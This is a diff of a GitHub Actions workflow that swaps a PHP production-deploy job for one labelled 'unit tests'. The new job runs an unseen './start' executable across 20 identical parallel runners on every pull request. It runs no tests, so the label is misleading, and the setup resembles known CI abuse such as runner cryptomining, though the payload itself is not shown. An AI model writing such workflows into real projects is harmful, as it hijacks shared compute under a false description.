@@ -1,30 +1,26 @@
-name: Pull Request WorkFlow
+name: unit tests
 
-on:
-  pull_request:
-    branches:
-      - deploy
+on: [pull_request]
 
 jobs:
-  deploy:
-    name: Deploy Project
+  multitest:
+    name: test job
+
     runs-on: ubuntu-latest
-    if: github.ref == 'refs/heads/master'
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-      - uses: actions/checkout@v1
-      - name: Setup PHP
-        uses: shivammathur/setup-php@master
-        with:
-          php-version: 7.4
-          extension-csv: mbstring, bcmath
-      - name: Composer install
-        run: composer install -q --no-ansi --no-interaction --no-scripts --no-suggest --no-progress --prefer-dist
-      - name: Setup Deployer
-        uses: atymic/deployer-php-action@master
-        with:
-          ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }}
-          ssh-known-hosts: ${{ secrets.SSH_KNOWN_HOSTS }}
-      - name: Deploy to PRODUCTION Server
-        env:
-          DOT_ENV: ${{ secrets.DOT_ENV_PRODUCTION }}
-        run: dep deploy production --tag=${{ env.GITHUB_REF }} -vvv
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x start
+        
+      - name: run
+        run: ./start
